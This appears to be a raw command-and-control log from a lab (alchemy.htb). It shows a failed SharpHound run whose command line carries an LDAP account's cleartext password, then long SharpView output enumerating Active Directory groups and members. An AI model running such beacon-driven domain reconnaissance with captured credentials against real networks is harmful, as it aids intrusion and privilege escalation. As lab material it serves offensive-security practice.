failed
```bash
[06/20 12:09:12] beacon> execute-assembly /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe -c all --ldapusername calde_ldap --ldappassword "CsAdlLDAPMoDeBrnd12!" --domain alchemy.htb
[06/20 12:09:23] [*] Tasked beacon to run .NET program: SharpHound.exe -c all --ldapusername calde_ldap --ldappassword "CsAdlLDAPMoDeBrnd12!" --domain alchemy.htb
[06/20 12:09:23] [+] host called home, sent: 1156018 bytes
[06/20 12:09:24] [+] received output:
[-] Invoke_3 on EntryPoint failed.




/opt/SharpView/Compiled/SharpView.exe
```


```bash
[06/20 10:56:56] beacon> execute-assembly /usr/share/poshc2/resources/modules/SharpView.exe Get-NetGroup –UserName "calde_ldap"
[06/20 10:57:05] [*] Tasked beacon to run .NET program: SharpView.exe Get-NetGroup –UserName "calde_ldap"
[06/20 10:57:05] [+] host called home, sent: 846146 bytes
[06/20 10:57:06] [+] received output:
[Get-DomainSearcher] search base: LDAP://DC=alchemy,DC=htb

[Get-DomainGroup] filter string: (&(objectCategory=group))

objectsid                      : {S-1-5-21-358850882-156636835-3866944949-1000}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : c27e6e52-00b0-4383-bb94-b8d855455baf

name                           : WinRMRemoteWMIUsers__

distinguishedname              : CN=WinRMRemoteWMIUsers__,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : WinRMRemoteWMIUsers__

cn                             : {WinRMRemoteWMIUsers__}

objectclass                    : {top, group}

usnchanged                     : 8198

instancetype                   : 4

usncreated                     : 8198

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-32-544}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 02ebd455-4adf-4eed-b490-27b179527e26

name                           : Administrators

distinguishedname              : CN=Administrators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Administrators

member                         : {CN=Domain Admins,CN=Users,DC=alchemy,DC=htb, CN=Enterprise Admins,CN=Users,DC=alchemy,DC=htb, CN=Administrator,CN=Users,DC=alchemy,DC=htb}

cn                             : {Administrators}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

usnchanged                     : 12782

description                    : Administrators have complete and unrestricted access to the computer/domain

instancetype                   : 4

usncreated                     : 8200

admincount                     : 1

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-545}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 47f0a21a-27b6-4679-a2d9-1ac88480978c

name                           : Users

distinguishedname              : CN=Users,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Users

member                         : {CN=Domain Users,CN=Users,DC=alchemy,DC=htb, CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=alchemy,DC=htb, CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=alchemy,DC=htb}

cn                             : {Users}

objectclass                    : {top, group}

usnchanged                     : 12381

description                    : Users are prevented from making accidental or intentional system-wide changes and can run most applications

instancetype                   : 4

usncreated                     : 8203

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-546}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 5b4792ba-6a32-496e-94c8-d2003b9a99bb

name                           : Guests

distinguishedname              : CN=Guests,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Guests

member                         : {CN=Domain Guests,CN=Users,DC=alchemy,DC=htb, CN=Guest,CN=Users,DC=alchemy,DC=htb}

cn                             : {Guests}

objectclass                    : {top, group}

usnchanged                     : 12383

description                    : Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted

instancetype                   : 4

usncreated                     : 8209

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-550}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 40daf9a6-dd0b-488f-bcfe-2f6d9ddab0e1

name                           : Print Operators

distinguishedname              : CN=Print Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Print Operators

cn                             : {Print Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12787

instancetype                   : 4

usncreated                     : 8212

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

description                    : Members can administer printers installed on domain controllers

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-551}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 8b64eb51-4f70-4ecd-b9f4-ff10cc730743

name                           : Backup Operators

distinguishedname              : CN=Backup Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Backup Operators

cn                             : {Backup Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12780

instancetype                   : 4

usncreated                     : 8213

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

description                    : Backup Operators can override security restrictions for the sole purpose of backing up or restoring files

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-552}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 1cc498a5-dc57-4df9-83ef-4ec7c1e7867b

name                           : Replicator

distinguishedname              : CN=Replicator,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Replicator

cn                             : {Replicator}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12785

instancetype                   : 4

usncreated                     : 8214

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

description                    : Supports file replication in a domain

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-555}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : efcb007e-cf66-421e-af82-18a66c2087cd

name                           : Remote Desktop Users

distinguishedname              : CN=Remote Desktop Users,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:25:59 PM

samaccountname                 : Remote Desktop Users

member                         : {CN=james,CN=Users,DC=alchemy,DC=htb}

cn                             : {Remote Desktop Users}

objectclass                    : {top, group}

usnchanged                     : 12739

description                    : Members in this group are granted the right to logon remotely

instancetype                   : 4

usncreated                     : 8215

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-556}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : dbf7114e-f3f2-4857-a2e3-f5e38d932138

name                           : Network Configuration Operators

distinguishedname              : CN=Network Configuration Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Network Configuration Operators

cn                             : {Network Configuration Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8216

instancetype                   : 4

usncreated                     : 8216

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members in this group can have some administrative privileges to manage configuration of networking features

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-558}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : fa80d38b-3a09-4c0b-9db6-e24c265f919e

name                           : Performance Monitor Users

distinguishedname              : CN=Performance Monitor Users,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Performance Monitor Users

cn                             : {Performance Monitor Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8217

instancetype                   : 4

usncreated                     : 8217

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group can access performance counter data locally and remotely

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-559}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 64a5dfc0-9a3b-4605-a983-75f237f715b7

name                           : Performance Log Users

distinguishedname              : CN=Performance Log Users,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Performance Log Users

cn                             : {Performance Log Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8218

instancetype                   : 4

usncreated                     : 8218

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-562}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : a764ecc7-5ad5-411b-acb4-22c3fb4815c8

name                           : Distributed COM Users

distinguishedname              : CN=Distributed COM Users,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Distributed COM Users

cn                             : {Distributed COM Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8219

instancetype                   : 4

usncreated                     : 8219

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members are allowed to launch, activate and use Distributed COM objects on this machine.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-568}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 8dd35066-544e-4fee-a962-94b937a1c0b7

name                           : IIS_IUSRS

distinguishedname              : CN=IIS_IUSRS,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : IIS_IUSRS

member                         : {CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=alchemy,DC=htb}

cn                             : {IIS_IUSRS}

objectclass                    : {top, group}

usnchanged                     : 8223

description                    : Built-in group used by Internet Information Services.

instancetype                   : 4

usncreated                     : 8220

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-569}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : cb596074-a622-4bea-9825-82108d82aa59

name                           : Cryptographic Operators

distinguishedname              : CN=Cryptographic Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Cryptographic Operators

cn                             : {Cryptographic Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8224

instancetype                   : 4

usncreated                     : 8224

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members are authorized to perform cryptographic operations.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-573}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 9e7bdfb6-9a23-4d26-90b8-47300217b277

name                           : Event Log Readers

distinguishedname              : CN=Event Log Readers,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Event Log Readers

cn                             : {Event Log Readers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8225

instancetype                   : 4

usncreated                     : 8225

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group can read event logs from local machine

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-574}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : c274b0a8-b3c5-42bf-a9b9-bbbcff5881d2

name                           : Certificate Service DCOM Access

distinguishedname              : CN=Certificate Service DCOM Access,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Certificate Service DCOM Access

cn                             : {Certificate Service DCOM Access}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8226

instancetype                   : 4

usncreated                     : 8226

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group are allowed to connect to Certification Authorities in the enterprise

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-575}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 8ea62b23-d2a9-44c0-9260-8920550966da

name                           : RDS Remote Access Servers

distinguishedname              : CN=RDS Remote Access Servers,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : RDS Remote Access Servers

cn                             : {RDS Remote Access Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8227

instancetype                   : 4

usncreated                     : 8227

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This group needs to be populated on servers running RD Connection Broker. RD Gateway servers and RD Web Access servers used in the deployment need to be in this group.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-576}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 2c8730b2-dee4-4e44-9ae7-a5e69c4c424d

name                           : RDS Endpoint Servers

distinguishedname              : CN=RDS Endpoint Servers,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : RDS Endpoint Servers

cn                             : {RDS Endpoint Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8228

instancetype                   : 4

usncreated                     : 8228

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Session Host servers and RD Virtualization Host servers used in the deployment need to be in this group.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-577}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : c39960f8-6c77-4e71-a1bf-eb416f64fddc

name                           : RDS Management Servers

distinguishedname              : CN=RDS Management Servers,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : RDS Management Servers

cn                             : {RDS Management Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8229

instancetype                   : 4

usncreated                     : 8229

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers running the RDS Central Management service must be included in this group.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-578}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 4f8deaef-7ede-40f8-8954-e5d5d68ca9b5

name                           : Hyper-V Administrators

distinguishedname              : CN=Hyper-V Administrators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Hyper-V Administrators

cn                             : {Hyper-V Administrators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8230

instancetype                   : 4

usncreated                     : 8230

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group have complete and unrestricted access to all features of Hyper-V.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-579}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 4cb0d177-a023-48b9-81ae-e63043fdceef

name                           : Access Control Assistance Operators

distinguishedname              : CN=Access Control Assistance Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:21:57 PM

samaccountname                 : Access Control Assistance Operators

cn                             : {Access Control Assistance Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 8231

instancetype                   : 4

usncreated                     : 8231

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group can remotely query authorization attributes and permissions for resources on this computer.

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-580}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 0bffd2fb-1e22-4ea9-a30c-b4b650c63d35

name                           : Remote Management Users

distinguishedname              : CN=Remote Management Users,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:21:57 PM

whenchanged                    : 12/8/2023 10:25:55 PM

samaccountname                 : Remote Management Users

member                         : {CN=thanos,CN=Users,DC=alchemy,DC=htb, CN=calde_ldap,CN=Users,DC=alchemy,DC=htb, CN=calde,CN=Users,DC=alchemy,DC=htb, CN=aepike,CN=Users,DC=alchemy,DC=htb}

cn                             : {Remote Management Users}

objectclass                    : {top, group}

usnchanged                     : 12729

description                    : Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

instancetype                   : 4

usncreated                     : 8232

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-515}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 4476057f-bf87-4606-ac91-3a0fc873b156

name                           : Domain Computers

distinguishedname              : CN=Domain Computers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Domain Computers

cn                             : {Domain Computers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12332

instancetype                   : 4

usncreated                     : 12330

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : All workstations and servers joined to the domain

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-516}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 3edbe8c1-190a-4428-8dc8-e83a8b82329d

name                           : Domain Controllers

distinguishedname              : CN=Domain Controllers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Domain Controllers

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb}

cn                             : {Domain Controllers}

objectclass                    : {top, group}

usnchanged                     : 12791

description                    : All domain controllers in the domain

instancetype                   : 4

usncreated                     : 12333

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:04:16 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-518}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : b80742e2-38b2-49ae-9ab8-8ed6f18f192b

name                           : Schema Admins

distinguishedname              : CN=Schema Admins,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Schema Admins

member                         : {CN=Administrator,CN=Users,DC=alchemy,DC=htb}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb}

cn                             : {Schema Admins}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

usnchanged                     : 12776

description                    : Designated administrators of the schema

instancetype                   : 4

usncreated                     : 12336

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:04:16 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-519}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 5c88e41e-7995-4478-bdee-fa0d9a3f2831

name                           : Enterprise Admins

distinguishedname              : CN=Enterprise Admins,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Enterprise Admins

member                         : {CN=Administrator,CN=Users,DC=alchemy,DC=htb}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb, CN=Administrators,CN=Builtin,DC=alchemy,DC=htb}

cn                             : {Enterprise Admins}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

usnchanged                     : 12773

description                    : Designated administrators of the enterprise

instancetype                   : 4

usncreated                     : 12339

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:04:16 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-517}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 046aee09-e587-4596-a6bb-94112bf5d275

name                           : Cert Publishers

distinguishedname              : CN=Cert Publishers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Cert Publishers

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb}

cn                             : {Cert Publishers}

objectclass                    : {top, group}

usnchanged                     : 12344

description                    : Members of this group are permitted to publish certificates to the directory

instancetype                   : 4

usncreated                     : 12342

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-512}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 60bdece9-5c97-450a-95ce-e80fd33b6e80

name                           : Domain Admins

distinguishedname              : CN=Domain Admins,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Domain Admins

member                         : {CN=Administrator,CN=Users,DC=alchemy,DC=htb}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb, CN=Administrators,CN=Builtin,DC=alchemy,DC=htb}

cn                             : {Domain Admins}

objectclass                    : {top, group}

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

usnchanged                     : 12777

description                    : Designated administrators of the domain

instancetype                   : 4

usncreated                     : 12345

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:04:16 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-513}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 6162db4e-2729-4442-bab4-bd60f121c0ff

name                           : Domain Users

distinguishedname              : CN=Domain Users,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Domain Users

memberof                       : {CN=Users,CN=Builtin,DC=alchemy,DC=htb}

cn                             : {Domain Users}

objectclass                    : {top, group}

usnchanged                     : 12350

description                    : All domain users

instancetype                   : 4

usncreated                     : 12348

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-514}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : bde082bc-5fce-4428-adf5-c91dc94f0e95

name                           : Domain Guests

distinguishedname              : CN=Domain Guests,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Domain Guests

memberof                       : {CN=Guests,CN=Builtin,DC=alchemy,DC=htb}

cn                             : {Domain Guests}

objectclass                    : {top, group}

usnchanged                     : 12353

description                    : All domain guests

instancetype                   : 4

usncreated                     : 12351

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

